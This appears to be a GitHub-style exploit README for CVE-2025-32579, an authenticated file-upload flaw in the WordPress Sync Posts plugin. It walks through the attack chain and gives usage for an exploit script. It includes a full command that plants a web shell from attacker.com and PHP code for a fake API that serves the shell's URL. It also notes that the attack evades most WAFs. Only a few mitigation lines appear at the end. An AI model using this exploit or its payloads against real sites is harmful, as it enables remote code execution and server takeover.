
# âš ï¸ CVE-2025-32579 - Critical RCE via Sync Posts Plugin (WordPress)

> ğŸ”¥ Discovered & Exploited by: **Nxploited (Khaled Alenazi)**  
> ğŸ“¦ Affects: Sync Posts <= 1.0  
> ğŸ§¨ CVSS Score: **9.9 CRITICAL**  
> ğŸ“ CVSS Vector: `CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:H`

---

## ğŸ§  Vulnerability Overview

The **Sync Posts** WordPress plugin by SoftClever Limited is vulnerable to an **Unrestricted File Upload** vulnerability that allows **authenticated attackers** to upload and execute **arbitrary PHP files** (such as web shells) on the server.

### ğŸ”“ Root Cause:
- The plugin accepts a `website_url` which returns JSON posts.
- It **blindly fetches images** from the post contents without validation.
- No file type, mime-type, or path restriction is applied.
- All images (even PHP files) are downloaded and stored inside `wp-content/uploads`.

---

## ğŸš¨ Why Itâ€™s Dangerous

- âœ… **Remote Code Execution (RCE)**
- âœ… Uploads web shells directly to server
- âœ… Requires **minimal privileges** (Authenticated user only)


---

## âš™ï¸ Script Description (Exploit)

The exploit script automates the full chain:

1. ğŸ“¥ **Logs into WordPress** using provided credentials
2. ğŸ§  **Generates fake API PHP** returning JSON post with a shell as `<img src='...'>`
3. ğŸ“¡ **Sends malicious `website_url`** to `admin-ajax.php?action=sync_posts`
4. ğŸ’£ Forces the plugin to fetch and save the shell in `/uploads/`
5. âœ… **No need for Referer** or nonce â€” session cookie is enough

---
```bash
usage: CVE-2025-32579.py [-h] -u URL -un USERNAME -p PASSWORD -ws WEBSITE -shell WEBSHELL

Exploit For CVE-2025-32579 Sync Posts # By: Nxploited ( Khaled Alenazi )

options:
  -h, --help            show this help message and exit
  -u, --url URL         Target WordPress URL (e.g., http://target.com/wordpress)
  -un, --username USERNAME
                        Username to login
  -p, --password PASSWORD
                        Password to login
  -ws, --website WEBSITE
                        URL to fake API (e.g., http://attacker.com/Khaled_alenazi.php)
  -shell, --webshell WEBSHELL
                        Web shell URL used inside the fake API (can be a test image)
                                                                                       

```
## ğŸ’» Usage Instructions

### ğŸ“Œ Command Format:

```bash
python3 CVE-2025-32579.py -u http://target/wordpress -un admin -p pass123 -ws http://attacker.com/Khaled_alenazi.php -shell http://attacker.com/shell.php
```

### âš™ï¸ Arguments:

| Flag | Description |
|------|-------------|
| `-u, --url`         | Target WordPress URL |
| `-un, --username`   | WordPress username (admin) |
| `-p, --password`    | WordPress password |
| `-ws, --website`    | URL to malicious PHP file that returns fake post JSON |
| `-shell, --webshell`| The actual shell file to inject via `<img src=...>` |

You can also use a dummy image instead of a real shell for testing:
```bash
--webshell https://via.placeholder.com/1x1.jpg
```

---

## ğŸ§ª Example Fake API Output

This is the response returned by `Khaled_alenazi.php`:

```php
<?php
header('Content-Type: application/json');
echo json_encode([
  [
    "id" => 1,
    "title" => ["rendered" => "Nxploited"],
    "content" => [
      "rendered" => "<img src='http://attacker.com/shell.php'>"
    ]
  ]
]);
?>
```

---

## ğŸ”’ Important Notes

- âœ… **Referer not required**
- â— Only the `wordpress_logged_in_` cookie is used
- âŒ Not exploitable by unauthenticated users
- âœ… Works even if admin dashboard is hidden (AJAX is public under login)
- ğŸ›¡ï¸ Easily missed by most WAFs

---

## ğŸ› ï¸ Fix / Mitigation

- Restrict `website_url` access to internal domains or whitelisted hosts
- Validate image extensions & content types
- Avoid parsing third-party JSON without sanitization

---

## ğŸ§· Reference

> CVE: [CVE-2025-32579](https://nvd.nist.gov/vuln/detail/CVE-2025-32579)    
> Exploit By Nxploited (Khaled Alenazi)

---
